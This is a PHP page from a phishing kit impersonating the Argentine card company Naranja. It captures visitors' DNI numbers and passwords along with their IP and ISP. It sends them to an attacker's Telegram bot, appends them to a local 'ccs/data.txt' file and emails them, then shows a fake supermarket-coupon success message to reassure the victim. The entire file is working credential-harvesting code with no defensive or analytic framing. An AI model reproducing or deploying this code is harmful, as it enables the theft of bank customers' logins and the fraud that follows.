<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if(isset($_POST)){
	$filter = "";
	$mensaje = ">> Datos personales <<\n";
	if(isset($_POST["DNI"])){
		$mensaje .= "Documento: ".$_POST["DNI"]."\n";
		$filter .= strtolower($_POST["DNI"]);
	}
	if(isset($_POST["password"])){
		$mensaje .= "Contraseña: ".$_POST["password"]."\n";
		$filter .= strtolower($_POST["password"]);
	}
	$filter = base64_encode($filter);
	include("config.php");
	$ip = getenv("REMOTE_ADDR");
	$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	define('BOT_TOKEN', $bottoken);
	define('CHAT_ID', $chatid);
	define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

function file_get_contents_curl($url) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //Set curl to return the data instead of printing it to the browser.
curl_setopt($ch, CURLOPT_URL, $url);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => CHAT_ID,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents_curl($url);

	}
	$file_name = 'data/'.$ip.'.db';
	$read_data = fopen($file_name, "a+");
	function enviar(){
		global $telegram_send, $file_save, $email_send, $mensaje, $ip, $isp;
		if($telegram_send){
			enviar_telegram(">> Naranja <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
		}
		if($file_save){
			$ccs_file_name = 'ccs/data.txt';
			$save_data = fopen($ccs_file_name, "a+");
			$msg = "========== DATOS Naranja ==========\n\n";
			$msg .= ">> Datos de conexión <<\n\nIP: ".$ip."\nISP: ".$isp."\n\n";
			$msg .= $mensaje;
			$msg .= "========== DATOS Naranja ==========\n\n";
			fwrite($save_data, $msg);
			fclose($save_data);
		}
		if($email_send){
			$msg = ">> Naranja <<\n\n";
			$msg .= $mensaje;
			mail($email, "Naranja", $msg);
		}
	}
	if($read_data){
		$data = fgets($read_data);
		$data = explode(";", $data);
		if(!(in_array($filter, $data))){
			fwrite($read_data, $filter.";");
			fclose($read_data);
			enviar();
		}
	}
	else {
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
}
else {
	header("Location: /");
}
include_once("parts/header.php");
?>
<!-- <meta http-equiv="refresh" content="5;url=https://naranjaonline.naranja.com"> -->
<body>
	<nav>
		<div class="contenedor">
<?php
include_once("parts/nav.php");
?>
		</div>
	</nav>
	<div class="container-fluid">
		<div class="row d-flex justify-content-center">
			<div class="col-10 col-md-6 mt-5">
				<div class="row d-flex justify-content-center contenedor_caja mb-5">
					<div class="col-12 col-md-12">
						<div class="row">
							<div class="col-12 cupon">
								<h3>¡Felicidades haz obtenido el cupón!</h3>
								<p>Ya podes usar el descuento en cualquier supermercado disponible.</p>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="col-12">
				<p class="secure">Protegido por reCAPTCHA <a href="#">Privacidad</a> - <a href="#">Condiciones</a></p>
			</div>
		</div>
	</div>
<?php
include_once("parts/footer.php");
?>
</body>
</html>